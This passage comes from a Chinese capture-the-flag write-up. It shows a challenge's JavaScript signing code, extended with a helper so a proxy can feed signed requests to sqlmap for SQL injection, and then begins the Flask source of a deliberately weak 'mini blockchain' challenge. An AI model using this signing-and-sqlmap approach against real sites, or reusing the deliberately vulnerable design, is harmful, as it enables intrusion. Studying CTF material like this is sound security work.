&lt;&lt; (<span class="number">24</span> - len % <span class="number">32</span>);</span><br><span class="line"> x[((len + <span class="number">64</span> &gt;&gt; <span class="number">9</span>) &lt;&lt; <span class="number">4</span>) + <span class="number">15</span>] = len;</span><br><span class="line"> <span class="keyword">var</span> w = <span class="built_in">Array</span>(<span class="number">80</span>);</span><br><span class="line"> <span class="keyword">var</span> a = <span class="number">1732584193</span>;</span><br><span class="line"> <span class="keyword">var</span> b = <span class="number">-271733879</span>;</span><br><span class="line"> <span class="keyword">var</span> c = <span class="number">-1732584194</span>;</span><br><span class="line"> <span class="keyword">var</span> d = <span class="number">271733878</span>;</span><br><span class="line"> <span class="keyword">var</span> e = <span class="number">-1009589776</span>;</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; x.length; i += <span class="number">16</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> olda = a;</span><br><span class="line">  <span class="keyword">var</span> oldb = b;</span><br><span class="line">  <span class="keyword">var</span> oldc = c;</span><br><span class="line">  <span class="keyword">var</span> oldd = d;</span><br><span class="line">  <span class="keyword">var</span> olde = e;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">80</span>; j++) &#123;</span><br><span class="line">   <span class="keyword">if</span> (j &lt; <span class="number">16</span>) w[j] = x[i + j];</span><br><span class="line">   <span class="keyword">else</span> w[j] = rol(w[j - <span class="number">3</span>] ^ w[j - <span class="number">8</span>] ^ w[j - <span class="number">14</span>] ^ w[j - <span class="number">16</span>], <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">var</span> t = safe_add(safe_add(rol(a, <span class="number">5</span>), math_enc_ft(j, b, c, d)), safe_add(safe_add(e, w[j]), math_enc_kt(j)));</span><br><span class="line">   e = d;</span><br><span class="line">   d = c;</span><br><span class="line">   c = rol(b, <span class="number">30</span>);</span><br><span class="line">   b = a;</span><br><span class="line">   a = t;</span><br><span class="line">  &#125;</span><br><span class="line">  a = safe_add(a, olda);</span><br><span class="line">  b = safe_add(b, oldb);</span><br><span class="line">  c = safe_add(c, oldc);</span><br><span class="line">  d = safe_add(d, oldd);</span><br><span class="line">  e = safe_add(e, olde);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">Array</span>(a, b, c, d, e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Perform the appropriate triplet combination function for the current</span></span><br><span class="line"><span class="comment"> * iteration</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">math_enc_ft</span>(<span class="params">t, b, c, d</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (t &lt; <span class="number">20</span>) <span class="keyword">return</span> (b &amp; c) | ((~b) &amp; d);</span><br><span class="line"> <span class="keyword">if</span> (t &lt; <span class="number">40</span>) <span class="keyword">return</span> b ^ c ^ d;</span><br><span class="line"> <span class="keyword">if</span> (t &lt; <span class="number">60</span>) <span class="keyword">return</span> (b &amp; c) | (b &amp; d) | (c &amp; d);</span><br><span class="line"> <span class="keyword">return</span> b ^ c ^ d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine the appropriate additive constant for the current iteration</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">math_enc_kt</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> (t &lt; <span class="number">20</span>) ? <span class="number">1518500249</span> : (t &lt; <span class="number">40</span>) ? <span class="number">1859775393</span> : (t &lt; <span class="number">60</span>) ? <span class="number">-1894007588</span> : <span class="number">-899497514</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Calculate the HMAC-SHA1 of a key and some data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">core_hmac_math_enc</span>(<span class="params">key, data</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> bkey = str2binb(key);</span><br><span class="line"> <span class="keyword">if</span> (bkey.length &gt; <span class="number">16</span>) bkey = core_math_enc(bkey, key.length * chrsz);</span><br><span class="line"> <span class="keyword">var</span> ipad = <span class="built_in">Array</span>(<span class="number">16</span>),</span><br><span class="line">  opad = <span class="built_in">Array</span>(<span class="number">16</span>);</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">  ipad[i] = bkey[i] ^ <span class="number">0x36363636</span>;</span><br><span class="line">  opad[i] = bkey[i] ^ <span class="number">0x5C5C5C5C</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">var</span> hash = core_math_enc(ipad.concat(str2binb(data)), <span class="number">512</span> + data.length * chrsz);</span><br><span class="line"> <span class="keyword">return</span> core_math_enc(opad.concat(hash), <span class="number">512</span> + <span class="number">160</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Add integers, wrapping at 2^32. This uses 16-bit operations internally</span></span><br><span class="line"><span class="comment"> * to work around bugs in some JS interpreters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_add</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> lsw = (x &amp; <span class="number">0xFFFF</span>) + (y &amp; <span class="number">0xFFFF</span>);</span><br><span class="line"> <span class="keyword">var</span> msw = (x &gt;&gt; <span class="number">16</span>) + (y &gt;&gt; <span class="number">16</span>) + (lsw &gt;&gt; <span class="number">16</span>);</span><br><span class="line"> <span class="keyword">return</span> (msw &lt;&lt; <span class="number">16</span>) | (lsw &amp; <span class="number">0xFFFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Bitwise rotate a 32-bit number to the left.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rol</span>(<span class="params">num, cnt</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> (num &lt;&lt; cnt) | (num &gt;&gt;&gt; (<span class="number">32</span> - cnt));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Convert an 8-bit or 16-bit string to an array of big-endian words</span></span><br><span class="line"><span class="comment"> * In 8-bit function, characters &gt;255 have their hi-byte silently ignored.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2binb</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> bin = <span class="built_in">Array</span>();</span><br><span class="line"> <span class="keyword">var</span> mask = (<span class="number">1</span> &lt;&lt; chrsz) - <span class="number">1</span>;</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length * chrsz; i += chrsz)</span><br><span class="line"> bin[i &gt;&gt; <span class="number">5</span>] |= (str.charCodeAt(i / chrsz) &amp; mask) &lt;&lt; (<span class="number">24</span> - i % <span class="number">32</span>);</span><br><span class="line"> <span class="keyword">return</span> bin;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Convert an array of big-endian words to a string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">binb2str</span>(<span class="params">bin</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> str = <span class="string">""</span>;</span><br><span class="line"> <span class="keyword">var</span> mask = (<span class="number">1</span> &lt;&lt; chrsz) - <span class="number">1</span>;</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bin.length * <span class="number">32</span>; i += chrsz)</span><br><span class="line"> str += <span class="built_in">String</span>.fromCharCode((bin[i &gt;&gt; <span class="number">5</span>] &gt;&gt;&gt; (<span class="number">24</span> - i % <span class="number">32</span>)) &amp; mask);</span><br><span class="line"> <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Convert an array of big-endian words to a hex string.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">binb2hex</span>(<span class="params">binarray</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> hex_tab = hexcase ? <span class="string">"0123456789ABCDEF"</span> : <span class="string">"0123456789abcdef"</span>;</span><br><span class="line"> <span class="keyword">var</span> str = <span class="string">""</span>;</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; binarray.length * <span class="number">4</span>; i++) &#123;</span><br><span class="line">  str += hex_tab.charAt((binarray[i &gt;&gt; <span class="number">2</span>] &gt;&gt; ((<span class="number">3</span> - i % <span class="number">4</span>) * <span class="number">8</span> + <span class="number">4</span>)) &amp; <span class="number">0xF</span>) + hex_tab.charAt((binarray[i &gt;&gt; <span class="number">2</span>] &gt;&gt; ((<span class="number">3</span> - i % <span class="number">4</span>) * <span class="number">8</span>)) &amp; <span class="number">0xF</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Convert an array of big-endian words to a base-64 string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">binb2b64</span>(<span class="params">binarray</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> tab = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line"> <span class="keyword">var</span> str = <span class="string">""</span>;</span><br><span class="line"> <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; binarray.length * <span class="number">4</span>; i += <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> triplet = (((binarray[i &gt;&gt; <span class="number">2</span>] &gt;&gt; <span class="number">8</span> * (<span class="number">3</span> - i % <span class="number">4</span>)) &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span>) | (((binarray[i + <span class="number">1</span> &gt;&gt; <span class="number">2</span>] &gt;&gt; <span class="number">8</span> * (<span class="number">3</span> - (i + <span class="number">1</span>) % <span class="number">4</span>)) &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span>) | ((binarray[i + <span class="number">2</span> &gt;&gt; <span class="number">2</span>] &gt;&gt; <span class="number">8</span> * (<span class="number">3</span> - (i + <span class="number">2</span>) % <span class="number">4</span>)) &amp; <span class="number">0xFF</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">   <span class="keyword">if</span> (i * <span class="number">8</span> + j * <span class="number">6</span> &gt; binarray.length * <span class="number">32</span>) str += b64pad;</span><br><span class="line">   <span class="keyword">else</span> str += tab.charAt((triplet &gt;&gt; <span class="number">6</span> * (<span class="number">3</span> - j)) &amp; <span class="number">0x3F</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">signGenerate</span>(<span class="params">obj, key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str0 = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>(i <span class="keyword">in</span> obj)&#123;</span><br><span class="line">      <span class="keyword">if</span>(i!=<span class="string">'sign'</span>)&#123;</span><br><span class="line">        str1=<span class="string">''</span>;</span><br><span class="line">        str1=i+<span class="string">'='</span>+obj[i];</span><br><span class="line">        str0+=str1</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hex_math_enc(str0+key)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj=&#123;<span class="attr">id</span>:<span class="string">''</span>,<span class="attr">title</span>:<span class="string">''</span>,<span class="attr">author</span>:<span class="string">''</span>,<span class="attr">date</span>:<span class="string">''</span>,<span class="attr">time</span>:<span class="built_in">parseInt</span>(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime()/<span class="number">1000</span>)&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submitt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  obj[<span class="string">'id'</span>]=<span class="built_in">document</span>.getElementById(<span class="string">'id'</span>).value;</span><br><span class="line">  obj[<span class="string">'title'</span>]=<span class="built_in">document</span>.getElementById(<span class="string">'title'</span>).value;</span><br><span class="line">  obj[<span class="string">'author'</span>]=<span class="built_in">document</span>.getElementById(<span class="string">'author'</span>).value;</span><br><span class="line">  obj[<span class="string">'date'</span>]=<span class="built_in">document</span>.getElementById(<span class="string">'date'</span>).value;</span><br><span class="line">  <span class="keyword">var</span> sign=signGenerate(obj,key);</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">'queryForm'</span>).action=<span class="string">"index.php?sig="</span>+sign+<span class="string">"&amp;time="</span>+obj.time;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">'queryForm'</span>).submit()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">submitgg</span>(<span class="params">id, title, date, author</span>)</span>&#123;</span><br><span class="line">  obj[<span class="string">'id'</span>]=id;</span><br><span class="line">  obj[<span class="string">'title'</span>]=title;</span><br><span class="line">  obj[<span class="string">'author'</span>]=author;</span><br><span class="line">  obj[<span class="string">'date'</span>]=date;</span><br><span class="line">  <span class="comment">// return obj;</span></span><br><span class="line">  <span class="keyword">var</span> sign=signGenerate(obj,key);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"index.php?sig="</span>+sign+<span class="string">"&amp;time="</span>+obj.time;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里，我们为了方便输入在js中添加了个<code>submitgg</code>函数，其他直接复制题目给的js。</p><p>运行代理服务器，此时可以</p><p><img src="/img/ddctf/4.png" alt=""></p><p>OK，将代理服务器的链接用于<code>sqlmap</code></p><p><img src="/img/ddctf/5.png" alt=""></p><p><img src="/img/ddctf/6.png" alt=""></p><h3 id="Web-4-mini-blockchain"><a href="#Web-4-mini-blockchain" class="headerlink" title="Web 4 mini blockchain"></a>Web 4 mini blockchain</h3><p>某银行利用区块链技术，发明了DiDiCoins记账系统。某宝石商店采用了这一方式来完成钻石的销售与清算过程。不幸的是，该银行被黑客入侵，私钥被窃取，维持区块链正常运转的矿机也全部宕机。现在，你能追回所有DDCoins，并且从商店购买2颗钻石么？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 2.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib, json, rsa, uuid, os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, escape, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span></span><br><span class="line">url_prefix = <span class="string">'/b9af31f66147e'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Here is your flag: DDCTF&#123;******************&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(hashlib.md5(x).digest()).hexdigest()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_reducer</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hash(hash(x)+hash(y))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">has_attrs</span><span class="params">(d, attrs)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(d) != type(&#123;&#125;): <span class="keyword">raise</span> Exception(<span class="string">"Input should be a dict/JSON"</span>)</span><br><span class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> attrs:</span><br><span class="line">        <span class="keyword">if</span> attr <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"&#123;&#125; should be presented in the input"</span>.format(attr))</span><br><span class="line"></span><br><span class="line">EMPTY_HASH = <span class="string">'0'</span>*<span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addr_to_pubkey</span><span class="params">(address)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> rsa.PublicKey(int(address, <span class="number">16</span>), <span class="number">65537</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pubkey_to_address</span><span class="params">(pubkey)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> pubkey.e == <span class="number">65537</span></span><br><span class="line">    hexed = hex(pubkey.n)</span><br><span class="line">    <span class="keyword">if</span> hexed.endswith(<span class="string">'L'</span>): hexed = hexed[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> hexed.startswith(<span class="string">'0x'</span>): hexed = hexed[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> hexed</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_addr_key_pair</span><span class="params">()</span>:</span></span><br><span class="line">    pubkey, privkey = rsa.newkeys(<span class="number">384</span>)</span><br><span class="line">    <span class="keyword">return</span> pubkey_to_address(pubkey), privkey</span><br><span class="line"></span><br><span class="line">bank_address, bank_privkey = gen_addr_key_pair()</span><br><span class="line">hacker_address, hacker_privkey = gen_addr_key_pair()</span><br><span class="line">shop_address, shop_privkey = gen_addr_key_pair()</span><br><span class="line">shop_wallet_address, shop_wallet_privkey = gen_addr_key_pair()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign_input_utxo</span><span class="params">(input_utxo_id, privkey)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> rsa.sign(input_utxo_id, privkey, <span class="string">'SHA-1'</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_utxo</span><span class="params">(utxo)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [utxo[<span class="string">'id'</span>], utxo[<span class="string">'addr'</span>], str(utxo[<span class="string">'amount'</span>])])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_output_utxo</span><span class="params">(addr_to, amount)</span>:</span></span><br><span class="line">    utxo = &#123;<span class="string">'id'</span>: str(uuid.uuid4()), <span class="string">'addr'</span>: addr_to, <span class="string">'amount'</span>: amount&#125;</span><br><span class="line">    utxo[<span class="string">'hash'</span>] = hash_utxo(utxo)</span><br><span class="line">    <span class="keyword">return</span> utxo</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_tx</span><span class="params">(tx)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [</span><br><span class="line">        reduce(hash_reducer, tx[<span class="string">'input'</span>], EMPTY_HASH),</span><br><span class="line">        reduce(hash_reducer, [utxo[<span class="string">'hash'</span>] <span class="keyword">for</span> utxo <span class="keyword">in</span> tx[<span class="string">'output'</span>]], EMPTY_HASH)</span><br><span class="line">    ])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx</span><span class="params">(input_utxo_ids, output_utxo, privkey_from=None)</span>:</span></span><br><span class="line">    tx = &#123;<span class="string">'input'</span>: input_utxo_ids, <span class="string">'signature'</span>: [sign_input_utxo(id, privkey_from) <span class="keyword">for</span> id <span class="keyword">in</span> input_utxo_ids], <span class="string">'output'</span>: output_utxo&#125;</span><br><span class="line">    tx[<span class="string">'hash'</span>] = hash_tx(tx)</span><br><span class="line">    <span class="keyword">return</span> tx</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_block</span><span class="params">(block)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> reduce(hash_reducer, [block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], reduce(hash_reducer, [tx[<span class="string">'hash'</span>] <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]], EMPTY_HASH)])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_block</span><span class="params">(prev_block_hash, nonce_str, transactions)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(prev_block_hash) != type(<span class="string">''</span>): <span class="keyword">raise</span> Exception(<span class="string">'prev_block_hash should be hex-encoded hash value'</span>)</span><br><span class="line">    nonce = str(nonce_str)</span><br><span class="line">    <span class="keyword">if</span> len(nonce) &gt; <span class="number">128</span>: <span class="keyword">raise</span> Exception(<span class="string">'the nonce is too long'</span>)</span><br><span class="line">    block = &#123;<span class="string">'prev'</span>: prev_block_hash, <span class="string">'nonce'</span>: nonce, <span class="string">'transactions'</span>: transactions&#125;</span><br><span class="line">    block[<span class="string">'hash'</span>] = hash_block(block)</span><br><span class="line">    <span class="keyword">return</span> block</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_blockchain_tail</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> max(session[<span class="string">'blocks'</span>].values(), key=<span class="keyword">lambda</span> block: block[<span class="string">'height'</span>])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate_utxo</span><span class="params">(blockchain_tail)</span>:</span></span><br><span class="line">    curr_block = blockchain_tail</span><br><span class="line">    blockchain = [curr_block]</span><br><span class="line">    <span class="keyword">while</span> curr_block[<span class="string">'hash'</span>] != session[<span class="string">'genesis_block_hash'</span>]:</span><br><span class="line">        curr_block = session[<span class="string">'blocks'</span>][curr_block[<span class="string">'prev'</span>]]</span><br><span class="line">        blockchain.append(curr_block)</span><br><span class="line">    blockchain = blockchain[::<span class="number">-1</span>]</span><br><span class="line">    utxos = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blockchain:</span><br><span class="line">        <span class="keyword">for</span> tx <span class="keyword">in</span> block[<span class="string">'transactions'</span>]:</span><br><span class="line">            <span class="keyword">for</span> input_utxo_id <span class="keyword">in</span> tx[<span class="string">'input'</span>]:</span><br><span class="line">                <span class="keyword">del</span> 